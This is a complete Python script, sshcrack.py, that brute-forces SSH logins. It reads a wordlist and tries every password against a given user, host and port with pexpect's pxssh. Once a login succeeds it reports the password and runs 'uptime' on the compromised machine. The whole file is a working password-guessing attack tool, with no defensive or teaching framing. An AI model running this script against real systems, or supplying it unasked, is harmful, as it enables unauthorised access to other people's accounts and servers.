#!venv/bin/python

import sys
from pathlib import Path
from pexpect import pxssh


try:
    wrd_arg = sys.argv[1]
    usr_arg = sys.argv[2]
    hst_arg = sys.argv[3]
    prt_arg = sys.argv[4]
except IndexError:
    print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
    sys.exit(1)

print("Arguments:", wrd_arg, usr_arg, hst_arg, prt_arg)

wrd_pth = Path(__file__).parent / f"{wrd_arg}"
if not wrd_pth.exists():
    print(f"Word list '{wrd_pth.name}' not found")
    sys.exit(1)

pws = []
with wrd_pth.open("r") as f:
    for pw in f.read().split("\n"):
        pws.append(pw)

print(f"Loaded {len(pws)} passwords from '{wrd_pth.name}'")

for pw in pws:
    try:
        ssh = pxssh.pxssh()
        ssh.force_password = True
        ssh.login(hst_arg, usr_arg, pw, port=prt_arg)
    except pxssh.ExceptionPxssh as e:
        if e.args[0] == "password refused":
            print(f"Password is not '{pw}'")
            continue
        else:
            raise
    else:
        print(f"Logged in! Password is '{pw}'")
        ssh.sendline("uptime")
        ssh.prompt()
        print(ssh.before.decode("utf-8"))
        break
